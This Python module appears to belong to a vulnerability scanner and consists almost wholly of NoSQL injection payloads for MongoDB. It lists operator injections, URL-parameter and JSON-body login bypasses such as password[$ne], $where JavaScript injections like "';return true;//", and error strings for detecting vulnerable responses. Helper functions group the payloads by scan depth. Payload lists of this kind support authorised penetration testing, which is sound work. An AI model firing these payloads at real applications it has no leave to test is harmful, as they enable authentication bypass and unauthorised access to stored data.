"""
NoSQL Injection Payloads — MongoDB operators, JSON injection, JavaScript injection.
"""

# ── MongoDB Query Operator Injection ─────────────────────────────────────────
MONGO_OPERATORS = [
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$ne":null}',
    '{"$gt":0}',
    '{"$gte":""}',
    '{"$lt":"z"}',
    '{"$regex":".*"}',
    '{"$regex":"^a"}',
    '{"$exists":true}',
    '{"$in":["admin","root"]}',
    '{"$nin":[""]}',
    '{"$or":[{},{"a":"a"}]}',
]

# ── URL Parameter Injection ──────────────────────────────────────────────────
URL_PARAM_INJECTION = [
    'username[$ne]=invalid&password[$ne]=invalid',
    'username[$gt]=&password[$gt]=',
    'username[$regex]=.*&password[$regex]=.*',
    'username[$exists]=true&password[$exists]=true',
    'username=admin&password[$ne]=wrongpass',
    'username[$in][]=admin&password[$ne]=x',
    'user[$regex]=^adm&password[$gt]=',
]

# ── JSON Body Injection ──────────────────────────────────────────────────────
JSON_INJECTION = [
    '{"username":{"$ne":""},"password":{"$ne":""}}',
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    '{"username":"admin","password":{"$ne":"wrongpass"}}',
    '{"username":{"$regex":".*"},"password":{"$regex":".*"}}',
    '{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":""}}',
    '{"$where":"1==1"}',
    '{"$where":"this.password.match(/.*/)"}',
]

# ── JavaScript Injection ($where) ────────────────────────────────────────────
JS_INJECTION = [
    "' || 1==1//",
    "' || ''=='",
    "';return true;//",
    "';return(true);//",
    '1;return true',
    '0 || true',
    'this.password.match(/.*/)',
    'function(){return true}',
    "' && this.password != ''//",
    "' && this.password.match(/^.{0,}$/)",
]

# ── NoSQL Error Indicators ───────────────────────────────────────────────────
NOSQL_ERROR_PATTERNS = [
    'MongoError',
    'MongoDB',
    'mongo',
    'SyntaxError',
    'CastError',
    'ValidationError',
    'BSONTypeError',
    'ReferenceError',
    'Cannot read property',
    'undefined is not',
    'TypeError',
    '$where',
    'mapReduce',
    'aggregate',
]


def get_all_nosql_payloads() -> list:
    """Return all NoSQL injection payloads combined."""
    return MONGO_OPERATORS + URL_PARAM_INJECTION + JSON_INJECTION + JS_INJECTION


def get_nosql_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate NoSQL payloads."""
    if depth == 'shallow':
        return MONGO_OPERATORS[:4] + URL_PARAM_INJECTION[:3]
    elif depth == 'medium':
        return MONGO_OPERATORS + URL_PARAM_INJECTION + JSON_INJECTION[:4]
    else:  # deep
        return get_all_nosql_payloads()
